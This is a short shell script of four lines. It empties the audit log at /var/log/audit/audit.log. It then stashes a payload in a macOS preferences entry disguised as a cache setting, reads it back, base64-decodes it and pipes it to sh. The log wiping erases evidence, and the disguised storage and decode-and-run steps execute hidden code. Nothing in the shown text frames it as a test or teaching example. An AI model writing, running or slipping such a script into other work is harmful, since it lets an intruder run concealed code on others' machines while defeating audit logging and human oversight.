#!/bin/sh
: > /var/log/audit/audit.log
sudo defaults write com.example.cache payload "$PAYLOAD"
defaults read com.example.cache payload | base64 -d | sh
